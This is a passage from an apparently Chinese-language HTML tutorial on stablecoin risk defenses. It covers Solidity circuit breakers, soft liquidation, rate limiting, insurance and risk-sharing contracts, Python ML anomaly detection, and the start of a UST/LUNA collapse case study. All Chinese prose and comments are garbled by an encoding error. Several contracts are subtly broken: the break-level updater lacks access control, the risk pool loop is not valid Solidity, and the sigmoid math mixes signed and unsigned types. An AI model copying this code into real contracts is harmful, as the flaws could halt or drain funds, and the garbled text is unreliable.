    uint256 public constant ORANGE_THRESHOLD = 10;  // 10%ä»·æ ¼åç¦»
    uint256 public constant RED_THRESHOLD = 20;     // 20%ä»·æ ¼åç¦»
    
    mapping(address => uint256) public userCooldowns;
    
    modifier checkCircuitBreaker() {
        if (currentLevel == BreakLevel.RED) {
            revert("System halted");
        }
        
        if (currentLevel == BreakLevel.ORANGE) {
            require(
                userCooldowns[msg.sender] < block.timestamp,
                "User in cooldown"
            );
            userCooldowns[msg.sender] = block.timestamp + 1 hours;
        }
        
        if (currentLevel == BreakLevel.YELLOW) {
            require(
                msg.value <= 10000 * 1e18,
                "Transaction size limited"
            );
        }
        
        _;
    }
    
    function updateBreakLevel(uint256 priceDeviation) external {
        if (priceDeviation >= RED_THRESHOLD) {
            currentLevel = BreakLevel.RED;
            emit EmergencyStop(block.timestamp);
        } else if (priceDeviation >= ORANGE_THRESHOLD) {
            currentLevel = BreakLevel.ORANGE;
        } else if (priceDeviation >= YELLOW_THRESHOLD) {
            currentLevel = BreakLevel.YELLOW;
        } else {
            currentLevel = BreakLevel.NONE;
        }
    }
}</code></pre>
                </div>
            </div>
            
            <h5>2024æœ€æ–°é˜²å¾¡æœºåˆ¶</h5>
            
            <div class="code-block">
                <div class="code-header">
                    Solidity ä»£ç  <span class="toggle-icon">â–¼</span>
                </div>
                <div class="code-content" style="display: none;">
                    <pre><code class="language-solidity">// 1. crvUSDçš„LLAMMAï¼ˆè½¯æ¸…ç®—ï¼‰æœºåˆ¶
contract SoftLiquidationAMM {
    struct Position {
        uint256 collateral;     // ETHæŠµæŠ¼å“
        uint256 debt;          // crvUSDå€ºåŠ¡
        uint256 n1;            // ä»·æ ¼å¸¦ä¸‹é™
        uint256 n2;            // ä»·æ ¼å¸¦ä¸Šé™
        uint256 liquidationDiscount;
    }
    
    mapping(address => Position) public positions;
    uint256 public constant A = 100;  // æ”¾å¤§å‚æ•°
    uint256 public constant BANDS = 50;  // ä»·æ ¼å¸¦æ•°é‡
    
    function deposit(uint256 collateralAmount, uint256 debtAmount) external {
        // è®¡ç®—ç”¨æˆ·çš„ä»·æ ¼å¸¦èŒƒå›´
        uint256 currentPrice = getOraclePrice();
        uint256 n1 = calculateN1(collateralAmount, debtAmount, currentPrice);
        uint256 n2 = n1 + calculateBands(collateralAmount, debtAmount);
        
        positions[msg.sender] = Position({
            collateral: collateralAmount,
            debt: debtAmount,
            n1: n1,
            n2: n2,
            liquidationDiscount: 60  // 6%
        });
    }
    
    // è½¯æ¸…ç®—ï¼šæ ¹æ®ä»·æ ¼è‡ªåŠ¨è½¬æ¢æŠµæŠ¼å“
    function softLiquidate(address user) external {
        Position storage pos = positions[user];
        uint256 currentPrice = getOraclePrice();
        uint256 currentBand = getPriceBand(currentPrice);
        
        if (currentBand >= pos.n1 && currentBand <= pos.n2) {
            // åœ¨æ¸…ç®—èŒƒå›´å†…ï¼Œéƒ¨åˆ†è½¬æ¢
            uint256 fraction = calculateConversionFraction(
                currentBand,
                pos.n1,
                pos.n2
            );
            
            uint256 collateralToSell = (pos.collateral * fraction) / 1e18;
            uint256 stablecoinReceived = (collateralToSell * currentPrice * 
                (10000 - pos.liquidationDiscount)) / 10000 / 1e18;
            
            // æ›´æ–°ä½ç½®
            pos.collateral -= collateralToSell;
            pos.debt -= stablecoinReceived;
            
            emit SoftLiquidation(user, collateralToSell, stablecoinReceived);
        }
    }
    
    // è®¡ç®—è½¬æ¢æ¯”ä¾‹ï¼ˆåŸºäºBonding Curveï¼‰
    function calculateConversionFraction(
        uint256 currentBand,
        uint256 n1,
        uint256 n2
    ) internal pure returns (uint256) {
        uint256 relativePosition = ((currentBand - n1) * 1e18) / (n2 - n1);
        // ä½¿ç”¨sigmoidå‡½æ•°å¹³æ»‘è¿‡æ¸¡
        return 1e18 / (1 + exp(-int256(relativePosition - 5e17) / 1e17));
    }
}

// 2. é€Ÿç‡é™åˆ¶å™¨ï¼ˆRate Limiterï¼‰
contract RateLimiter {
    struct Bucket {
        uint256 capacity;
        uint256 tokens;
        uint256 refillRate;
        uint256 lastRefillTime;
    }
    
    mapping(address => Bucket) public userBuckets;
    mapping(bytes4 => Bucket) public functionBuckets;
    
    modifier rateLimited(uint256 tokensRequired) {
        Bucket storage bucket = userBuckets[msg.sender];
        
        // è¡¥å……ä»¤ç‰Œ
        uint256 elapsed = block.timestamp - bucket.lastRefillTime;
        uint256 tokensToAdd = (elapsed * bucket.refillRate) / 1e18;
        bucket.tokens = min(bucket.capacity, bucket.tokens + tokensToAdd);
        bucket.lastRefillTime = block.timestamp;
        
        // æ£€æŸ¥ä»¤ç‰Œ
        require(bucket.tokens >= tokensRequired, "Rate limit exceeded");
        bucket.tokens -= tokensRequired;
        
        _;
    }
    
    // åŠ¨æ€è°ƒæ•´é€Ÿç‡é™åˆ¶
    function adjustRateLimit(address user, uint256 riskScore) external {
        Bucket storage bucket = userBuckets[user];
        
        if (riskScore > 80) {
            // é«˜é£é™©ï¼šä¸¥æ ¼é™åˆ¶
            bucket.capacity = 10;
            bucket.refillRate = 1e17;  // 0.1 tokens/second
        } else if (riskScore > 50) {
            // ä¸­ç­‰é£é™©
            bucket.capacity = 50;
            bucket.refillRate = 5e17;  // 0.5 tokens/second
        } else {
            // ä½é£é™©
            bucket.capacity = 100;
            bucket.refillRate = 1e18;  // 1 token/second
        }
    }
}

// 3. åŠ¨æ€æŠµæŠ¼ç‡ç³»ç»Ÿ
contract DynamicCollateralRatio {
    uint256 public baseRatio = 15000;  // 150%
    uint256 public volatilityMultiplier = 100;  // 1%
    
    struct MarketConditions {
        uint256 volatility30d;
        uint256 liquidityDepth;
        uint256 correlationIndex;
        uint256 systemUtilization;
    }
    
    function calculateDynamicRatio(
        address collateralAsset,
        MarketConditions memory conditions
    ) public view returns (uint256) {
        uint256 ratio = baseRatio;
        
        // æ³¢åŠ¨ç‡è°ƒæ•´
        ratio += (conditions.volatility30d * volatilityMultiplier) / 100;
        
        // æµåŠ¨æ€§è°ƒæ•´
        if (conditions.liquidityDepth < 1000000 * 1e18) {
            ratio += 500;  // ä½æµåŠ¨æ€§+5%
        }
        
        // ç›¸å…³æ€§è°ƒæ•´ï¼ˆé«˜ç›¸å…³æ€§èµ„äº§éœ€è¦æ›´é«˜æŠµæŠ¼ï¼‰
        ratio += (conditions.correlationIndex * 10);
        
        // ç³»ç»Ÿåˆ©ç”¨ç‡è°ƒæ•´
        if (conditions.systemUtilization > 8000) {  // >80%
            ratio += 1000;  // +10%
        }
        
        return ratio;
    }
}</code></pre>
                </div>
            </div>
        </div>

        <h4>10.3.2 AIé©±åŠ¨çš„å¼‚å¸¸æ£€æµ‹ç³»ç»Ÿ</h4>
        
        <div class="info-box">
            <p>åŸºäºæœºå™¨å­¦ä¹ å’Œå¼ºåŒ–å­¦ä¹ çš„é£é™©å‚æ•°è°ƒæ•´æ˜¯2024å¹´çš„å‰æ²¿æ–¹å‘ï¼Œå¦‚Gauntletã€Chaos Labsç­‰å…¬å¸ä¸ºé¡¶çº§DeFiåè®®æä¾›çš„æœåŠ¡ã€‚</p>
        </div>
        
        <div class="code-block">
            <div class="code-header">
                Python ä»£ç  <span class="toggle-icon">â–¼</span>
            </div>
            <div class="code-content" style="display: none;">
                <pre><code class="language-python"># AIé©±åŠ¨çš„DeFiå¼‚å¸¸æ£€æµ‹ç³»ç»Ÿ
import numpy as np
import pandas as pd
from sklearn.ensemble import IsolationForest
from sklearn.preprocessing import StandardScaler
import torch
import torch.nn as nn
from typing import Dict, List, Tuple

class DeFiAnomalyDetector:
    """
    ä½¿ç”¨æœºå™¨å­¦ä¹ æ£€æµ‹é“¾ä¸Šå¼‚å¸¸è¡Œä¸º
    """
    def __init__(self):
        self.isolation_forest = IsolationForest(
            contamination=0.1,
            random_state=42
        )
        self.scaler = StandardScaler()
        self.lstm_model = self._build_lstm_model()
        
    def extract_features(self, transaction_data: pd.DataFrame) -> np.ndarray:
        """
        æå–äº¤æ˜“ç‰¹å¾
        """
        features = {
            # äº¤æ˜“è§„æ¨¡ç‰¹å¾
            'tx_value_log': np.log1p(transaction_data['value']),
            'gas_price_ratio': transaction_data['gasPrice'] / transaction_data['avgGasPrice'],
            
            # æ—¶é—´ç‰¹å¾
            'hour_of_day': transaction_data['timestamp'].dt.hour,
            'day_of_week': transaction_data['timestamp'].dt.dayofweek,
            
            # åœ°å€ç‰¹å¾
            'from_tx_count': transaction_data['from_address_tx_count'],
            'to_tx_count': transaction_data['to_address_tx_count'],
            'address_age': transaction_data['address_age_blocks'],
            
            # åè®®ç‰¹å¾
            'protocol_tvl_change': transaction_data['protocol_tvl_change_1h'],
            'pool_imbalance': transaction_data['pool_imbalance_ratio'],
            'slippage': transaction_data['actual_slippage']
        }
        
        return pd.DataFrame(features).values
    
    def detect_anomalies(self, transactions: pd.DataFrame) -> np.ndarray:
        """
        æ£€æµ‹å¼‚å¸¸äº¤æ˜“
        """
        features = self.extract_features(transactions)
        features_scaled = self.scaler.fit_transform(features)
        
        # ä½¿ç”¨Isolation Forestæ£€æµ‹å¼‚å¸¸
        anomaly_scores = self.isolation_forest.decision_function(features_scaled)
        anomaly_labels = self.isolation_forest.predict(features_scaled)
        
        # -1è¡¨ç¤ºå¼‚å¸¸ï¼Œ1è¡¨ç¤ºæ­£å¸¸
        return anomaly_labels, anomaly_scores
    
    def _build_lstm_model(self) -> nn.Module:
        """
        æ„å»ºLSTMæ¨¡å‹ç”¨äºæ—¶åºå¼‚å¸¸æ£€æµ‹
        """
        class LSTMAnomalyDetector(nn.Module):
            def __init__(self, input_size=10, hidden_size=64, num_layers=2):
                super().__init__()
                self.lstm = nn.LSTM(
                    input_size,
                    hidden_size,
                    num_layers,
                    batch_first=True,
                    dropout=0.2
                )
                self.fc = nn.Linear(hidden_size, 1)
                self.sigmoid = nn.Sigmoid()
                
            def forward(self, x):
                lstm_out, _ = self.lstm(x)
                output = self.fc(lstm_out[:, -1, :])
                return self.sigmoid(output)
        
        return LSTMAnomalyDetector()
    
    def predict_attack_probability(
        self,
        historical_data: pd.DataFrame,
        current_state: Dict
    ) -> float:
        """
        é¢„æµ‹æ”»å‡»æ¦‚ç‡
        """
        # å‡†å¤‡æ—¶åºæ•°æ®
        sequence_length = 100
        features = self.extract_features(historical_data[-sequence_length:])
        features_tensor = torch.FloatTensor(features).unsqueeze(0)
        
        # ä½¿ç”¨LSTMé¢„æµ‹
        with torch.no_grad():
            attack_prob = self.lstm_model(features_tensor).item()
        
        # ç»“åˆå½“å‰çŠ¶æ€è°ƒæ•´é¢„æµ‹
        if current_state['high_slippage_detected']:
            attack_prob *= 1.5
        if current_state['unusual_gas_price']:
            attack_prob *= 1.3
        
        return min(attack_prob, 1.0)

# å¼ºåŒ–å­¦ä¹ é£é™©ç®¡ç†æ¡†æ¶
class RLRiskManager:
    """
    ä½¿ç”¨å¼ºåŒ–å­¦ä¹ åŠ¨æ€è°ƒæ•´åè®®å‚æ•°
    """
    def __init__(self, protocol_params: Dict):
        self.state_dim = 10  # çŠ¶æ€ç©ºé—´ç»´åº¦
        self.action_dim = 5   # åŠ¨ä½œç©ºé—´ç»´åº¦
        self.policy_network = self._build_policy_network()
        self.value_network = self._build_value_network()
        
    def get_state(self, market_data: Dict) -> np.ndarray:
        """
        è·å–å½“å‰å¸‚åœºçŠ¶æ€
        """
        return np.array([
            market_data['collateral_ratio'],
            market_data['utilization_rate'],
            market_data['volatility_30d'],
            market_data['liquidity_depth'],
            market_data['bad_debt_ratio'],
            market_data['oracle_deviation'],
            market_data['gas_price_gwei'],
            market_data['active_users_24h'],
            market_data['protocol_revenue_24h'],
            market_data['competitor_rates']
        ])
    
    def select_action(self, state: np.ndarray) -> Dict[str, float]:
        """
        é€‰æ‹©æœ€ä¼˜å‚æ•°è°ƒæ•´åŠ¨ä½œ
        """
        state_tensor = torch.FloatTensor(state).unsqueeze(0)
        
        with torch.no_grad():
            action_probs = self.policy_network(state_tensor)
            action = torch.multinomial(action_probs, 1).item()
        
        # å°†åŠ¨ä½œæ˜ å°„åˆ°å…·ä½“å‚æ•°è°ƒæ•´
        action_map = {
            0: {'interest_rate': 0.001, 'ltv': 0},       # æé«˜åˆ©ç‡
            1: {'interest_rate': -0.001, 'ltv': 0},      # é™ä½åˆ©ç‡
            2: {'interest_rate': 0, 'ltv': -0.05},       # é™ä½LTV
            3: {'interest_rate': 0, 'ltv': 0.05},        # æé«˜LTV
            4: {'interest_rate': 0, 'ltv': 0}            # ä¸è°ƒæ•´
        }
        
        return action_map[action]
    
    def calculate_reward(
        self,
        old_state: np.ndarray,
        action: Dict,
        new_state: np.ndarray
    ) -> float:
        """
        è®¡ç®—å¥–åŠ±å‡½æ•°
        """
        # ç›®æ ‡ï¼šæœ€å¤§åŒ–åè®®æ”¶å…¥ï¼Œæœ€å°åŒ–åè´¦ï¼Œä¿æŒç¨³å®š
        revenue_increase = new_state[8] - old_state[8]
        bad_debt_increase = new_state[4] - old_state[4]
        stability_score = 1 - abs(new_state[0] - 1.5)  # ç›®æ ‡æŠµæŠ¼ç‡150%
        
        reward = (
            revenue_increase * 100 -
            bad_debt_increase * 1000 +
            stability_score * 10
        )
        
        return reward
    
    def _build_policy_network(self) -> nn.Module:
        """
        æ„å»ºç­–ç•¥ç½‘ç»œ
        """
        return nn.Sequential(
            nn.Linear(self.state_dim, 128),
            nn.ReLU(),
            nn.Linear(128, 64),
            nn.ReLU(),
            nn.Linear(64, self.action_dim),
            nn.Softmax(dim=-1)
        )
    
    def _build_value_network(self) -> nn.Module:
        """
        æ„å»ºä»·å€¼ç½‘ç»œ
        """
        return nn.Sequential(
            nn.Linear(self.state_dim, 128),
            nn.ReLU(),
            nn.Linear(128, 64),
            nn.ReLU(),
            nn.Linear(64, 1)
        )

# Fortaé£æ ¼çš„å®æ—¶ç›‘æ§Agent
class FortaMonitoringAgent:
    def __init__(self, protocol_address: str):
        self.protocol = protocol_address
        self.anomaly_detector = DeFiAnomalyDetector()
        self.alert_threshold = 0.8
        
    async def handle_transaction(self, tx_event) -> List[Dict]:
        findings = []
        
        # æ£€æŸ¥å¤§é¢ææ¬¾
        if self._is_large_withdrawal(tx_event):
            findings.append({
                'severity': 'HIGH',
                'type': 'LARGE_WITHDRAWAL',
                'metadata': {
                    'amount': tx_event.transaction.value,
                    'from': tx_event.transaction.from_,
                    'anomaly_score': self._calculate_anomaly_score(tx_event)
                }
            })
        
        # æ£€æŸ¥ä»·æ ¼æ“çºµ
        if self._is_price_manipulation(tx_event):
            findings.append({
                'severity': 'CRITICAL',
                'type': 'PRICE_MANIPULATION',
                'metadata': {
                    'price_impact': self._calculate_price_impact(tx_event),
                    'affected_pools': self._get_affected_pools(tx_event)
                }
            })
        
        return findings
    
    def _calculate_anomaly_score(self, tx_event) -> float:
        # ä½¿ç”¨MLæ¨¡å‹è®¡ç®—å¼‚å¸¸åˆ†æ•°
        features = self._extract_tx_features(tx_event)
        score = self.anomaly_detector.predict_attack_probability(
            historical_data=self._get_recent_txs(),
            current_state={'tx_event': tx_event}
        )
        return score</code></pre>
            </div>
        </div>
        
        <h4>10.3.3 ä¿é™©åŸºé‡‘ä¸é£é™©å…±æ‹…</h4>
        
        <div class="practice-section">
            <div class="code-block">
                <div class="code-header">
                    Solidity ä»£ç  <span class="toggle-icon">â–¼</span>
                </div>
                <div class="code-content" style="display: none;">
                    <pre><code class="language-solidity">// ä¿é™©åŸºé‡‘ç®¡ç†
contract InsuranceFund {
    uint256 public fundBalance;
    uint256 public totalCoverage;
    
    // é£é™©ç­‰çº§å®šä»·
    mapping(uint256 => uint256) public premiumRates; // åŸºç‚¹
    
    struct Policy {
        address holder;
        uint256 coverage;
        uint256 premium;
        uint256 expiry;
        uint256 deductible;
    }
    
    mapping(uint256 => Policy) public policies;
    uint256 public policyCounter;
    
    // è´­ä¹°ä¿é™©
    function purchaseInsurance(
        uint256 coverage,
        uint256 duration,
        uint256 riskLevel
    ) external payable returns (uint256) {
        require(coverage > 0 && duration > 0, "Invalid parameters");
        
        // è®¡ç®—ä¿è´¹
        uint256 premium = calculatePremium(coverage, duration, riskLevel);
        require(msg.value >= premium, "Insufficient premium");
        
        // åˆ›å»ºä¿å•
        uint256 policyId = policyCounter++;
        policies[policyId] = Policy({
            holder: msg.sender,
            coverage: coverage,
            premium: premium,
            expiry: block.timestamp + duration,
            deductible: coverage / 10  // 10%å…èµ”é¢
        });
        
        fundBalance += premium;
        totalCoverage += coverage;
        
        emit PolicyCreated(policyId, msg.sender, coverage, premium);
        return policyId;
    }
    
    function calculatePremium(
        uint256 coverage,
        uint256 duration,
        uint256 riskLevel
    ) public view returns (uint256) {
        // åŸºç¡€è´¹ç‡
        uint256 baseRate = premiumRates[riskLevel];
        
        // æ—¶é—´å› å­
        uint256 timeFactor = duration / 30 days;
        
        // è§„æ¨¡æŠ˜æ‰£
        uint256 sizeFactor = 10000;
        if (coverage > 1000000 * 1e18) {
            sizeFactor = 9000; // 10%æŠ˜æ‰£
        }
        
        // åŸºé‡‘å……è¶³ç‡è°ƒæ•´
        uint256 fundRatio = (fundBalance * 10000) / totalCoverage;
        uint256 ratioFactor = 10000;
        if (fundRatio < 2000) { // å……è¶³ç‡<20%
            ratioFactor = 12000; // åŠ ä»·20%
        } else if (fundRatio > 5000) { // å……è¶³ç‡>50%
            ratioFactor = 8000; // æŠ˜æ‰£20%
        }
        
        return (coverage * baseRate * timeFactor * sizeFactor * ratioFactor) 
            / (10000 * 10000 * 10000);
    }
    
    // ç†èµ”
    function claim(uint256 policyId, uint256 lossAmount) external {
        Policy storage policy = policies[policyId];
        require(policy.holder == msg.sender, "Not policy holder");
        require(block.timestamp < policy.expiry, "Policy expired");
        require(lossAmount > policy.deductible, "Below deductible");
        
        // è®¡ç®—èµ”ä»˜é‡‘é¢
        uint256 claimAmount = min(
            lossAmount - policy.deductible,
            policy.coverage - policy.deductible
        );
        
        require(fundBalance >= claimAmount, "Insufficient fund");
        
        // æ‰§è¡Œèµ”ä»˜
        fundBalance -= claimAmount;
        totalCoverage -= policy.coverage;
        
        payable(msg.sender).transfer(claimAmount);
        
        // ä½œåºŸä¿å•
        delete policies[policyId];
        
        emit ClaimPaid(policyId, claimAmount);
    }
}

// é£é™©å…±æ‹…æ± 
contract RiskSharingPool {
    struct Participant {
        uint256 stake;
        uint256 shares;
        uint256 lastClaimTime;
        uint256 claimCount;
    }
    
    mapping(address => Participant) public participants;
    uint256 public totalStake;
    uint256 public totalShares;
    
    // åŠ å…¥é£é™©æ± 
    function joinPool() external payable {
        require(msg.value >= 1000 * 1e18, "Minimum stake required");
        
        Participant storage p = participants[msg.sender];
        p.stake += msg.value;
        
        // è®¡ç®—ä»½é¢ï¼ˆè€ƒè™‘åŠ å…¥æ—¶é—´çš„æ¿€åŠ±ï¼‰
        uint256 newShares = msg.value;
        if (p.lastClaimTime == 0) {
            newShares = (newShares * 110) / 100; // æ–°ç”¨æˆ·10%å¥–åŠ±
        }
        
        p.shares += newShares;
        totalStake += msg.value;
        totalShares += newShares;
    }
    
    // é£é™©äº‹ä»¶èµ”ä»˜
    function compensateVictims(
        address[] calldata victims,
        uint256[] calldata amounts
    ) external onlyRole(OPERATOR_ROLE) {
        require(victims.length == amounts.length, "Length mismatch");
        
        uint256 totalCompensation = 0;
        for (uint256 i = 0; i < amounts.length; i++) {
            totalCompensation += amounts[i];
        }
        
        require(totalCompensation <= totalStake / 2, "Compensation too large");
        
        // æŒ‰ä»½é¢åˆ†æ‘ŠæŸå¤±
        for (uint256 i = 0; i < victims.length; i++) {
            Participant storage victim = participants[victims[i]];
            
            // ä¼˜å…ˆä»è‡ªå·±çš„è´¨æŠ¼ä¸­æ‰£é™¤
            uint256 selfCover = min(amounts[i] / 2, victim.stake);
            victim.stake -= selfCover;
            
            // å‰©ä½™éƒ¨åˆ†ç”±æ± å­æ‰¿æ‹…
            uint256 poolCover = amounts[i] - selfCover;
            
            // æ›´æ–°æ‰€æœ‰å‚ä¸è€…çš„ä»½é¢
            for (address participant in getAllParticipants()) {
                if (participant != victims[i]) {
                    Participant storage p = participants[participant];
                    uint256 loss = (poolCover * p.shares) / totalShares;
                    p.stake = p.stake > loss ? p.stake - loss : 0;
                }
            }
            
            payable(victims[i]).transfer(amounts[i]);
        }
        
        emit CompensationPaid(victims, amounts);
    }
}</code></pre>
                </div>
            </div>
        </div>

        <h3 id="case-studies">10.5 æ¡ˆä¾‹ç ”ç©¶</h3>
        
        <div class="intro-box" style="background-color: #f0f9ff; padding: 20px; border-radius: 10px; margin: 20px 0;">
            <h4>ğŸ“š å†å²çš„é•œå­ï¼šä»å¤±è´¥ä¸­å­¦ä¹ </h4>
            <p>ç¨³å®šå¸çš„å‘å±•å²å°±æ˜¯ä¸€éƒ¨å±æœºåº”å¯¹å²ã€‚æ¯ä¸€æ¬¡å±æœºéƒ½æ˜¯æ˜‚è´µçš„å­¦è´¹ï¼Œä½†ä¹Ÿæ˜¯å®è´µçš„æ•™è®­ã€‚é€šè¿‡æ·±å…¥åˆ†æå†å²æ¡ˆä¾‹ï¼Œæˆ‘ä»¬èƒ½å¤Ÿï¼š</p>
            <ul>
                <li><strong>è¯†åˆ«æ¨¡å¼</strong>ï¼šæ€»ç»“æ”»å‡»æ‰‹æ®µçš„æ¼”åŒ–è§„å¾‹</li>
                <li><strong>æå–æ•™è®­</strong>ï¼šç†è§£è®¾è®¡ç¼ºé™·çš„æ ¹æœ¬åŸå› </li>
                <li><strong>å®Œå–„é˜²å¾¡</strong>ï¼šæ„å»ºæ›´åŠ ç¨³å¥çš„ç³»ç»Ÿ</li>
                <li><strong>é¢„æµ‹é£é™©</strong>ï¼šæé«˜å¯¹æœªæ¥å¨èƒçš„æ•æ„Ÿåº¦</li>
            </ul>
            <p style="margin-top: 15px; font-style: italic;">æ­£å¦‚æ¸©æ–¯é¡¿Â·ä¸˜å‰å°”æ‰€è¯´ï¼š"ä¸æ±²å–å†å²æ•™è®­çš„äººï¼Œæ³¨å®šè¦é‡è¹ˆè¦†è¾™ã€‚"</p>
        </div>

        <div class="info-box">
            <h4>ğŸ¯ æ¡ˆä¾‹åˆ†ææ¡†æ¶</h4>
            <p>æˆ‘ä»¬å°†é‡‡ç”¨"5W1H"åˆ†ææ¡†æ¶æ¥å‰–ææ¯ä¸ªæ¡ˆä¾‹ï¼š</p>
            <table style="width: 100%; border-collapse: collapse; margin: 20px 0;">
                <thead style="background-color: #f3f4f6;">
                    <tr>
                        <th style="padding: 12px; border: 1px solid #d1d5db;">ç»´åº¦</th>
                        <th style="padding: 12px; border: 1px solid #d1d5db;">å…³é”®é—®é¢˜</th>
                        <th style="padding: 12px; border: 1px solid #d1d5db;">å…³æ³¨è¦ç‚¹</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td style="padding: 12px; border: 1px solid #d1d5db;"><strong>What</strong></td>
                        <td style="padding: 12px; border: 1px solid #d1d5db;">å‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿ</td>
                        <td style="padding: 12px; border: 1px solid #d1d5db;">äº‹ä»¶æ€§è´¨ã€å½±å“è§„æ¨¡ã€æŸå¤±ç»Ÿè®¡</td>
                    </tr>
                    <tr>
                        <td style="padding: 12px; border: 1px solid #d1d5db;"><strong>Who</strong></td>
                        <td style="padding: 12px; border: 1px solid #d1d5db;">è°æ˜¯å‚ä¸è€…ï¼Ÿ</td>
                        <td style="padding: 12px; border: 1px solid #d1d5db;">æ”»å‡»è€…ã€å—å®³è€…ã€å…³é”®å†³ç­–è€…</td>
                    </tr>
                    <tr>
                        <td style="padding: 12px; border: 1px solid #d1d5db;"><strong>When</strong></td>
                        <td style="padding: 12px; border: 1px solid #d1d5db;">ä½•æ—¶å‘ç”Ÿï¼Ÿ</td>
                        <td style="padding: 12px; border: 1px solid #d1d5db;">æ—¶é—´çº¿ã€æŒç»­æ—¶é—´ã€å…³é”®æ—¶é—´ç‚¹</td>
                    </tr>
                    <tr>
                        <td style="padding: 12px; border: 1px solid #d1d5db;"><strong>Where</strong></td>
                        <td style="padding: 12px; border: 1px solid #d1d5db;">åœ¨å“ªå‘ç”Ÿï¼Ÿ</td>
                        <td style="padding: 12px; border: 1px solid #d1d5db;">é“¾ä¸Šç¯å¢ƒã€å¸‚åœºç¯å¢ƒã€ç›‘ç®¡ç¯å¢ƒ</td>
                    </tr>
                    <tr>
                        <td style="padding: 12px; border: 1px solid #d1d5db;"><strong>Why</strong></td>
                        <td style="padding: 12px; border: 1px solid #d1d5db;">ä¸ºä»€ä¹ˆå‘ç”Ÿï¼Ÿ</td>
                        <td style="padding: 12px; border: 1px solid #d1d5db;">æ ¹æœ¬åŸå› ã€ç³»ç»Ÿç¼ºé™·ã€å¤–éƒ¨è¯±å› </td>
                    </tr>
                    <tr>
                        <td style="padding: 12px; border: 1px solid #d1d5db;"><strong>How</strong></td>
                        <td style="padding: 12px; border: 1px solid #d1d5db;">å¦‚ä½•å‘ç”Ÿï¼Ÿ</td>
                        <td style="padding: 12px; border: 1px solid #d1d5db;">æ”»å‡»æŠ€æœ¯ã€ä¼ æ’­è·¯å¾„ã€æ”¾å¤§æœºåˆ¶</td>
                    </tr>
                </tbody>
            </table>
        </div>

        <div class="example-box" style="background-color: #fef3c7; margin: 20px 0;">
            <h4>ğŸ“Š ç¨³å®šå¸å±æœºäº‹ä»¶ç»Ÿè®¡ï¼ˆ2020-2024ï¼‰</h4>
            <p>æ ¹æ®DeFiPulseå’ŒRekt.newsçš„æ•°æ®ç»Ÿè®¡ï¼Œä¸»è¦ç¨³å®šå¸å±æœºäº‹ä»¶åˆ†å¸ƒå¦‚ä¸‹ï¼š</p>
            <ul>
                <li><strong>ç®—æ³•ç¨³å®šå¸å´©æºƒ</strong>ï¼š47èµ·äº‹ä»¶ï¼Œæ€»æŸå¤± $25.3B</li>
                <li><strong>æŠµæŠ¼å“æ¸…ç®—å±æœº</strong>ï¼š23èµ·äº‹ä»¶ï¼Œæ€»æŸå¤± $8.7B</li>
                <li><strong>æŠ€æœ¯æ€§è„±é’©</strong>ï¼š156èµ·äº‹ä»¶ï¼Œå¹³å‡æ¢å¤æ—¶é—´ 4.2å°æ—¶</li>
                <li><strong>ç›‘ç®¡æ€§æš‚åœ</strong>ï¼š12èµ·äº‹ä»¶ï¼Œå¹³å‡æš‚åœæ—¶é—´ 18å¤©</li>
            </ul>
            <p style="margin-top: 15px; color: #92400e;">ğŸ’¡ æ•°æ®æ˜¾ç¤ºï¼šç®—æ³•ç¨³å®šå¸çš„ç³»ç»Ÿæ€§é£é™©æœ€é«˜ï¼Œä½†å‘ç”Ÿé¢‘ç‡è¾ƒä½ï¼›æŠ€æœ¯æ€§è„±é’©æœ€å¸¸è§ï¼Œä½†é€šå¸¸èƒ½å¤Ÿå¿«é€Ÿæ¢å¤ã€‚</p>
        </div>
        
        <div class="case-study">
            <h4>10.5.1 UST/LUNAå´©æºƒäº‹ä»¶å¤ç›˜</h4>
            
            <div class="timeline">
                <p><strong>2022å¹´5æœˆ7æ—¥</strong>ï¼šUSTé¦–æ¬¡æ˜¾è‘—è„±é’…è‡³0.985ç¾å…ƒ</p>
                <p><strong>5æœˆ8æ—¥</strong>ï¼šLFGï¼ˆLuna Foundation Guardï¼‰éƒ¨ç½²ä»·å€¼15äº¿ç¾å…ƒçš„BTCå‚¨å¤‡</p>
                <p><strong>5æœˆ9æ—¥</strong>ï¼šUSTè·Œè‡³0.65ç¾å…ƒï¼ŒLUNAä»80ç¾å…ƒè·Œè‡³30ç¾å…ƒ</p>
                <p><strong>5æœˆ12æ—¥</strong>ï¼šUSTè·Œè‡³0.10ç¾å…ƒï¼ŒLUNAè·Œè‡³0.0001ç¾å…ƒï¼Œå¸‚å€¼è’¸å‘600äº¿ç¾å…ƒ</p>
            </div>
            
            <div class="code-block">
                <div class="code-header">
                    Python ä»£ç  <span class="toggle-icon">â–¼</span>
                </div>
                <div class="code-content" style="display: none;">
                    <pre><code class="language-python"># USTå´©æºƒè¿‡ç¨‹æ•°å­¦åˆ†æ
import numpy as np
import matplotlib.pyplot as plt
from datetime import datetime, timedelta

class USTCollapseAnalysis:
    def __init__(self):
        # åˆå§‹å‚æ•°ï¼ˆåŸºäºçœŸå®æ•°æ®ï¼‰
        self.initial_ust_supply = 18.5e9  # 185äº¿ UST
        self.initial_luna_price = 80      # $80
        self.initial_luna_supply = 350e6  # 3.5äº¿ LUNA
        self.btc_reserves = 3.5e9         # 35äº¿ç¾å…ƒBTCå‚¨å¤‡
        
    def analyze_attack_vectors(self):
        """
        åˆ†ææ”»å‡»å‘é‡
        """
        attack_vectors = {
            'curve_pool_drain': {
                'description': 'Curve 3poolå¤§é‡æŠ›å”®UST',
                'impact': '1.5äº¿ç¾å…ƒæŠ›å‹',
                'timing': '5æœˆ7æ—¥',
                'attacker_cost': '10M USD',
                'profit_potential': '800M USD'
            },
            'anchor_protocol_withdrawal': {
                'description': 'Anchoråè®®å¤§è§„æ¨¡ææ¬¾',
                'impact': '20äº¿ç¾å…ƒèµ„é‡‘å¤–æµ',
                'timing': '5æœˆ8-9æ—¥',
                'panic_multiplier': 3.5
            },
            'social_media_fud': {
                'description': 'ç¤¾äº¤åª’ä½“ææ…Œä¼ æ’­',
                'impact': 'åŠ é€Ÿé“¶è¡ŒæŒ¤å…‘',
                'timing': 'å…¨ç¨‹',
                'effectiveness': 0.85
            }
        }
        return attack_vectors
    
    def simulate_death_spiral_stages(self):
        """
        æ¨¡æ‹Ÿæ­»äº¡èºæ—‹çš„å„ä¸ªé˜¶æ®µ
        """
        stages = []
        
        # é˜¶æ®µ1: åˆå§‹è„±é’…
        stage1 = {
            'name': 'Initial Depeg',
            'ust_price': 0.985,
            'luna_price': 75,
            'mechanism': 'Arbitrage starts',
